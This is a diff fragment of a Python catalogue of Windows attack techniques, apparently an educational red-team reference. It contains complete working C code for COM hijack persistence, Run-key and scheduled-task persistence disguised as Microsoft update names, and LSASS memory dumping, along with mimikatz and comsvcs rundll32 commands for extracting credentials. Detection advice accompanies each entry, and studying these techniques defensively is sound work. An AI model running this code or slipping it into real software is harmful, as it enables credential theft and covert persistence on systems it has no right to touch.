+            "Shows AmsiScanBuffer's original prologue bytes, applies the patch, "
+            "and demonstrates a mock scan returning CLEAN after patching."
+        ),
+    },
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # PERSISTENCE
+    # ─────────────────────────────────────────────────────────────────────────
+    {
+        "id": "com_hijacking",
+        "name": "COM Hijacking",
+        "category": "Persistence",
+        "difficulty": "Intermediate",
+        "platform": "Windows",
+        "mitre_attack": "T1546.015",
+        "tags": ["COM", "CLSID", "registry", "hijack", "persistence", "DLL"],
+        "short_desc": "Registers a malicious CLSID in HKCU to redirect COM object instantiation to attacker-controlled code.",
+        "description": (
+            "The Component Object Model (COM) is Windows' object-oriented IPC framework. When code calls "
+            "CoCreateInstance(CLSID), Windows searches the registry for the InprocServer32 path in this order: "
+            "HKCU\\Software\\Classes\\CLSID first, then HKLM\\Software\\Classes\\CLSID.\n\n"
+            "Because HKCU requires no elevated privileges, any user can register a CLSID there. If a "
+            "privileged process (Task Scheduler, Explorer, svchost) instantiates a COM object whose CLSID "
+            "is registered in HKCU, Windows loads the attacker's DLL instead of the legitimate one — "
+            "even from an unprivileged account.\n\n"
+            "This gives persistent code execution every time the target application starts, with no "
+            "administrator privileges needed. Many Windows scheduled tasks and Explorer extensions "
+            "instantiate well-known COM objects, making them reliable persistence targets."
+        ),
+        "how_it_works": [
+            "Identify a CLSID used by a high-value target (Explorer, Task Scheduler, MMC) that is registered only in HKLM.",
+            "Use ProcMon to capture 'HKCU\\...\\CLSID\\{...}\\InprocServer32 → NAME NOT FOUND' — these are hijackable CLSIDs.",
+            "Create the key: HKCU\\Software\\Classes\\CLSID\\{target-CLSID}\\InprocServer32",
+            "Set the default value to the path of your malicious DLL.",
+            "Set ThreadingModel to 'Apartment' (or match the original).",
+            "The next time the target process loads, it queries HKCU first and loads your DLL.",
+            "Your DLL's DllMain(DLL_PROCESS_ATTACH) runs with the target process's privileges.",
+            "For persistence: the registry key survives reboots — execution happens every time the app starts.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <stdio.h>
+
+// Target: {BCDE0395-E52F-467C-8E3D-C4579291692E}
+// Used by MsftEdit — loaded by many Office applications
+// Registered in HKLM only → hijackable from HKCU
+#define TARGET_CLSID L"{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+#define PAYLOAD_DLL  L"C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll"
+
+BOOL InstallCOMHijack(void) {
+    wchar_t keyPath[512];
+    swprintf_s(keyPath, 512,
+        L"Software\\Classes\\CLSID\\%s\\InprocServer32",
+        TARGET_CLSID);
+
+    HKEY hKey;
+    LSTATUS ls = RegCreateKeyExW(
+        HKEY_CURRENT_USER, keyPath, 0, NULL,
+        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+
+    if (ls != ERROR_SUCCESS) {
+        printf("[-] RegCreateKeyEx failed: %ld\n", ls);
+        return FALSE;
+    }
+
+    // Set default value = path to malicious DLL
+    ls = RegSetValueExW(hKey, NULL, 0, REG_SZ,
+                         (BYTE *)PAYLOAD_DLL,
+                         (DWORD)((wcslen(PAYLOAD_DLL) + 1) * sizeof(wchar_t)));
+    if (ls != ERROR_SUCCESS) { RegCloseKey(hKey); return FALSE; }
+
+    // Set ThreadingModel to avoid COM loader errors
+    const wchar_t *tm = L"Apartment";
+    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
+                    (BYTE *)tm, (DWORD)((wcslen(tm) + 1) * sizeof(wchar_t)));
+
+    RegCloseKey(hKey);
+    printf("[+] COM hijack installed:\n");
+    printf("    HKCU\\%ls\n", keyPath);
+    printf("    → %ls\n", PAYLOAD_DLL);
+    printf("[*] Will fire next time an app calls CoCreateInstance(%ls)\n", TARGET_CLSID);
+    return TRUE;
+}
+
+BOOL RemoveCOMHijack(void) {
+    wchar_t keyPath[512];
+    swprintf_s(keyPath, 512, L"Software\\Classes\\CLSID\\%s", TARGET_CLSID);
+    RegDeleteTreeW(HKEY_CURRENT_USER, keyPath);
+    printf("[*] COM hijack removed\n");
+    return TRUE;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc > 1 && strcmp(argv[1], "remove") == 0)
+        return RemoveCOMHijack() ? 0 : 1;
+    return InstallCOMHijack() ? 0 : 1;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "New HKCU\\Software\\Classes\\CLSID entries that mirror HKLM CLSIDs are a direct indicator.",
+            "Monitor RegCreateKey / RegSetValueEx calls to HKCU\\...\\CLSID paths.",
+            "Compare HKCU CLSID registrations against a baseline — any new entry deserves review.",
+            "ProcMon: DLL load events where the loaded path is user-writable (AppData, Temp, etc.).",
+            "Application Whitelisting / AppLocker: block DLL loads from user-writable directories.",
+            "Autoruns (Sysinternals): specifically highlights HKCU COM hijack candidates.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Walks through the COM lookup order, shows the HKCU registry key creation, "
+            "and animates the hijack firing when a mock CoCreateInstance call is made."
+        ),
+    },
+
+    {
+        "id": "registry_persistence",
+        "name": "Registry Run Key Persistence",
+        "category": "Persistence",
+        "difficulty": "Beginner",
+        "platform": "Windows",
+        "mitre_attack": "T1547.001",
+        "tags": ["registry", "Run key", "persistence", "autorun", "startup", "HKCU"],
+        "short_desc": "Adds a value to a Registry Run key so the payload executes automatically on every user logon.",
+        "description": (
+            "Registry Run keys are the simplest and oldest persistence mechanism on Windows. Values "
+            "added to these keys cause the OS to execute the specified command at user login (HKCU) or "
+            "system startup (HKLM). No elevation is required for HKCU keys.\n\n"
+            "Key locations:\n"
+            "• HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — current user, every logon\n"
+            "• HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — all users, needs admin\n"
+            "• HKCU\\...\\RunOnce — fires once then deletes itself\n"
+            "• HKLM\\...\\RunServices — legacy service autostart\n\n"
+            "Despite being extremely well-known and monitored, Run keys remain widely used in real "
+            "malware because they are reliable, survive reboots, and require minimal code. They are "
+            "typically combined with other techniques (masquerading, DLL sideloading) to reduce visibility."
+        ),
+        "how_it_works": [
+            "Choose the persistence scope: HKCU (no privileges) or HKLM (admin required).",
+            "Open the Run key with RegOpenKeyExA(HKCU, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', KEY_WRITE).",
+            "Write the payload path: RegSetValueExA(hKey, 'UpdateService', REG_SZ, payloadPath).",
+            "The value name is arbitrary — malware often uses names that mimic legitimate software.",
+            "Close the key handle.",
+            "On the next user logon, Windows reads the Run key and launches the payload.",
+            "Clean up with RegDeleteValueA when persistence is no longer needed.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <stdio.h>
+
+#define RUN_KEY  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define VALUE_NAME "WindowsUpdateHelper"
+
+BOOL InstallRunPersistence(const char *payloadPath) {
+    HKEY hKey;
+    LSTATUS ls = RegOpenKeyExA(
+        HKEY_CURRENT_USER,  // no privileges required
+        RUN_KEY,
+        0, KEY_WRITE, &hKey);
+
+    if (ls != ERROR_SUCCESS) {
+        printf("[-] RegOpenKeyEx failed: %ld\n", ls);
+        return FALSE;
+    }
+
+    ls = RegSetValueExA(
+        hKey,
+        VALUE_NAME,         // value name — blend in
+        0,
+        REG_SZ,
+        (BYTE *)payloadPath,
+        (DWORD)(strlen(payloadPath) + 1));
+
+    RegCloseKey(hKey);
+
+    if (ls == ERROR_SUCCESS) {
+        printf("[+] Persistence installed:\n");
+        printf("    HKCU\\%s\n", RUN_KEY);
+        printf("    %s = \"%s\"\n", VALUE_NAME, payloadPath);
+        printf("[*] Will execute on next logon\n");
+        return TRUE;
+    }
+    printf("[-] RegSetValueEx failed: %ld\n", ls);
+    return FALSE;
+}
+
+BOOL RemovePersistence(void) {
+    HKEY hKey;
+    RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_WRITE, &hKey);
+    LSTATUS ls = RegDeleteValueA(hKey, VALUE_NAME);
+    RegCloseKey(hKey);
+    if (ls == ERROR_SUCCESS) { printf("[+] Persistence removed\n"); return TRUE; }
+    printf("[-] Value not found\n");
+    return FALSE;
+}
+
+// Alternative: scheduled task persistence (no Run key, harder to detect)
+BOOL InstallScheduledTask(const char *payloadPath) {
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd),
+        "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" "
+        "/tr \"%s\" /sc onlogon /f /rl highest",
+        payloadPath);
+    return system(cmd) == 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <payload_path> [remove]\n", argv[0]);
+        return 1;
+    }
+    if (argc > 2 && strcmp(argv[2], "remove") == 0)
+        return RemovePersistence() ? 0 : 1;
+
+    return InstallRunPersistence(argv[1]) ? 0 : 1;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "Autoruns (Sysinternals) — the gold standard for Run key enumeration and reputation checking.",
+            "Monitor RegSetValueEx writes to any Run / RunOnce key path via ETW or EDR.",
+            "Baseline comparison: new Run key values that weren't present before are immediately suspicious.",
+            "Value names mimicking legitimate software (MicrosoftUpdate, WindowsDefender) — check the actual path.",
+            "Payload path in user-writable directories (AppData, Temp) combined with a Run key entry.",
+            "Windows Defender: Run key monitoring is a built-in behavioral rule.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Live demo: creates a real HKCU Run key value pointing to a harmless echo command, "
+            "shows it in the registry, then removes it — demonstrating install and cleanup."
+        ),
+    },
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # CREDENTIAL ACCESS
+    # ─────────────────────────────────────────────────────────────────────────
+    {
+        "id": "lsass_dumping",
+        "name": "LSASS Memory Dumping",
+        "category": "Credential Access",
+        "difficulty": "Advanced",
+        "platform": "Windows",
+        "mitre_attack": "T1003.001",
+        "tags": ["LSASS", "credentials", "dump", "MiniDump", "comsvcs", "Mimikatz"],
+        "short_desc": "Dumps the LSASS process memory to extract NTLM hashes, Kerberos tickets, and plaintext credentials.",
+        "description": (
+            "The Local Security Authority Subsystem Service (lsass.exe) is the Windows process "
+            "responsible for authentication. It caches credentials in memory: NTLM password hashes, "
+            "Kerberos TGTs, and (in older/misconfigured systems) WDigest plaintext passwords.\n\n"
+            "Dumping LSASS memory and processing it offline with tools like Mimikatz, pypykatz, or "
+            "Impacket allows an attacker to extract these credentials — enabling Pass-the-Hash, "
+            "Pass-the-Ticket, and lateral movement across the network.\n\n"
+            "Methods range from noisy to stealthy:\n"
+            "• Task Manager: right-click lsass → Create dump file (requires admin, very detectable)\n"
+            "• comsvcs.dll MiniDump via rundll32 (classic, flagged by most AV)\n"
+            "• MiniDumpWriteDump API (programmatic, easily hooked)\n"
+            "• Direct memory read via NtReadVirtualMemory with kernel handles (EDR bypass)\n"
+            "• Shadow copies / VSS to access the SAM hive offline\n"
+            "• ProcDump (signed Microsoft tool — often allowed by allowlists)"
+        ),
+        "how_it_works": [
+            "Obtain SeDebugPrivilege: AdjustTokenPrivileges with SE_DEBUG_NAME.",
+            "OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPID).",
+            "Call MiniDumpWriteDump(hLsass, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL).",
+            "The dump file contains all of LSASS's virtual memory including credential caches.",
+            "Transfer dump offline and process with: mimikatz 'sekurlsa::minidump lsass.dmp' + 'sekurlsa::logonpasswords'.",
+            "Alternative (comsvcs): rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full",
+            "Stealthier: use NtReadVirtualMemory directly with a handle obtained via kernel driver or PPL bypass.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <tlhelp32.h>
+#include <dbghelp.h>
+#include <stdio.h>
+
+#pragma comment(lib, "dbghelp.lib")
+
+DWORD GetLsassPID(void) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
+    DWORD pid = 0;
+
+    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
+        if (!_wcsicmp(pe.szExeFile, L"lsass.exe")) {
+            pid = pe.th32ProcessID;
+            break;
+        }
+    }
+    CloseHandle(snap);
+    return pid;
+}
+
+BOOL EnableDebugPrivilege(void) {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                           TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1 };
+    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    return GetLastError() == ERROR_SUCCESS;
+}
+
+BOOL DumpLSASS(const wchar_t *outPath) {
+    if (!EnableDebugPrivilege()) {
+        printf("[-] SeDebugPrivilege failed — need admin\n");
+        return FALSE;
+    }
+
+    DWORD pid = GetLsassPID();
+    if (!pid) { printf("[-] LSASS not found\n"); return FALSE; }
+    printf("[+] LSASS PID = %lu\n", pid);
+
+    HANDLE hLsass = OpenProcess(
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        FALSE, pid);
+    if (!hLsass) {
+        printf("[-] OpenProcess failed: %lu  (PPL protection active?)\n",
+               GetLastError());
+        return FALSE;
+    }
+
+    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) { CloseHandle(hLsass); return FALSE; }
+
+    BOOL ok = MiniDumpWriteDump(
+        hLsass, pid, hFile,
+        MiniDumpWithFullMemory,   // full process memory
+        NULL, NULL, NULL);
+
+    CloseHandle(hFile);
+    CloseHandle(hLsass);
+
+    if (ok) {
+        printf("[+] Dump written to %ls\n", outPath);
+        printf("[*] Process offline: mimikatz# sekurlsa::minidump %ls\n", outPath);
+        printf("[*]                  mimikatz# sekurlsa::logonpasswords\n");
+    } else {
+        printf("[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
+    }
+    return ok;
+}
+
+int main(void) {
+    return DumpLSASS(L"C:\\Windows\\Temp\\lsass.dmp") ? 0 : 1;
+}
+
+// ── Alternative: comsvcs.dll one-liner (no custom code needed) ───────────────
+// rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Temp\lsass.dmp full
+""",
+        "code_language": "c",
+        "detection": [
+            "OpenProcess targeting lsass.exe with VM_READ access — the single strongest indicator.",
+            "MiniDumpWriteDump called with lsass.exe handle — directly flagged by all major EDRs.",
+            "Handle table auditing: lsass.exe has PPL (Protected Process Light) on modern Windows — any access attempt to it is logged.",
+            "Windows Credential Guard: moves credential secrets into an isolated VM (VSM) — LSASS dump reveals no useful data.",
+            "Enable LSA Protection (RunAsPPL): prevents non-PPL processes from opening LSASS with VM_READ.",
+            "Audit Object Access policy: enable 'Audit Sensitive Privilege Use' and 'Audit Handle Manipulation' for lsass.",
+            "Comsvcs MiniDump: rundll32 spawning with comsvcs.dll and process ID arguments is a well-known signature.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Step-by-step walkthrough: privilege escalation, LSASS handle acquisition, dump creation, "
+            "and offline processing — showing exactly what data is extracted and why PPL matters."
         ),
     },
 ]
